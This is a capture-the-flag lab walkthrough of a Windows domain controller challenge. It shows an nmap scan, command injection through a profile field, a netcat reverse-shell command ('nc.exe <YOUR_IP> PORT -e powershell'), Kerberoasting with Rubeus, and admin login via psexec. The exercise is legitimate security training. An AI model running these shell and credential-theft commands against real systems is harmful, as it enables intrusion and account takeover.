# H1:Medium!
## @Author : M3tr1c_r00t
```
   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( H | 1 | : | M | e | d | i | u | m )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
```
### Enumeration...
```
# Nmap 7.92 scan initiated Tue Dec  6 17:02:26 2022 as: nmap -sC -sV -A -v -oN nmapscan.txt 10.10.110.172
Nmap scan report for 10.10.110.172
Host is up (0.17s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: PhotoStore - Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
81/tcp   open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Network Monitor
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
82/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: C967A141ABFF1D6AB42CE7440E58128C
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-12-06 14:02:42Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2022-12-06T14:04:52+00:00; -3h00m01s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TROY
|   NetBIOS_Domain_Name: TROY
|   NetBIOS_Computer_Name: TROY-DC
|   DNS_Domain_Name: troy.thm
|   DNS_Computer_Name: TROY-DC.troy.thm
|   DNS_Tree_Name: troy.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-12-06T14:04:12+00:00
| ssl-cert: Subject: commonName=TROY-DC.troy.thm
| Issuer: commonName=TROY-DC.troy.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-05T13:58:10
| Not valid after:  2023-06-06T13:58:10
| MD5:   1bc6 4a8a 2d03 9e3e 6ac7 7698 f486 23c9
|_SHA-1: 6fa0 163f 1616 6c7e 621e ac16 8f8c 1834 9099 ee8e
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Tue, 06 Dec 2022 14:02:43 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Tue, 06 Dec 2022 14:02:42 GMT
|_    Content-Length: 0

Host script results:
|_clock-skew: mean: -3h00m01s, deviation: 0s, median: -3h00m01s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-06T14:04:11
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  6 17:04:56 2022 -- 1 IP address (1 host up) scanned in 149.94 seconds

```
From the nmap scan, we can see the machine is a windows machine....
 So , lets visit the web server...
 ![Screenshot_2022-12-06_17_03_47](https://user-images.githubusercontent.com/99975622/210141422-1a6c2192-21c1-4dce-b74b-177fa2936e32.png)
We can see there's a login and signup pane, so we are gonna sign up....
<br> After signing up, you can see there is a profile pane where we can change our name and password....

![Screenshot_2022-12-06_17_04_02](https://user-images.githubusercontent.com/99975622/210141437-6707bfda-6beb-407a-8025-f13ac1320c58.png)
When you press tab, it automatically gets deleted, so there's probably some filtering going on...
![Screenshot_2022-12-06_17_06_08](https://user-images.githubusercontent.com/99975622/210141490-45314f85-54d0-4158-850c-f6a1bec088d0.png)

<br>On inspecting the site, we can see there's a js script which controls the data being input...
![Screenshot_2022-12-06_17_06_18](https://user-images.githubusercontent.com/99975622/210141501-e20c6a53-a939-499d-b202-0fe826b40f9d.png)
We can block the script then try exploiting the changing the username pane...
![Screenshot_2022-12-06_17_07_04](https://user-images.githubusercontent.com/99975622/210141523-778ad401-5248-411f-bd5e-f07b1914f8a8.png)
And boom! It works ...
<br>So now we can try getting a reverse shell...

locate the nc.exe binary on your linux distro or download it ...
![Screenshot_2022-12-06_17_07_39](https://user-images.githubusercontent.com/99975622/210141554-af00084b-cfa1-4845-b490-e1fcd70ef15e.png)

Next, send it to the machine....
![Screenshot_2022-12-06_17_09_43](https://user-images.githubusercontent.com/99975622/210141562-e5bd0a94-d014-446b-94f0-503a619a5738.png)

After that, set up a listener and then execute the binary using....
```
met | nc.exe <YOUR_IP> PORT -e powershell
```
![Screenshot_2022-12-06_17_11_55](https://user-images.githubusercontent.com/99975622/210141763-ce5a1c3d-c0ec-4dc4-9230-33c1c9872e34.png)

And we've gotten a shell
![Screenshot_2022-12-06_17_13_24](https://user-images.githubusercontent.com/99975622/210142231-6fb1e810-b7ec-469d-af94-880009ec7b7f.png)
 ### Priv Esc...
 After typing net user, we can see that achilles is the administrator....
 Next, you can try attacking the SAM file but no luck :(
 
 #### Attacking Kerberos
 I tried to  use GetNPUsers.py but we can try using Rubeus.exe 
 <br> After transferring the binary to the machine, run this command
 ```
 .\Rubeus.exe kerberoast /nowrap
 ```
 the /nowrap command makes sure there is now space between the hash...

![Screenshot_2022-12-06_17_18_04](https://user-images.githubusercontent.com/99975622/210145784-376a57c9-37f2-43e3-99be-a4da48a1db09.png)
Next, save the hash into a file then brute force it with john-the-ripper...

![Screenshot_2022-12-06_17_19_09](https://user-images.githubusercontent.com/99975622/210146140-648f133f-bbcd-42a5-af7f-501481893970.png)

After getting the password, you can now login to the machine using te psexec.py script as achilles...



![Screenshot_2022-12-06_17_30_30](https://user-images.githubusercontent.com/99975622/210146513-6acf6f03-1af6-4e91-984c-4407b21b9cb7.png)
And now you are administrator!


Well, you know the drill!
<br> Defense is up to you!
<br> :)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/

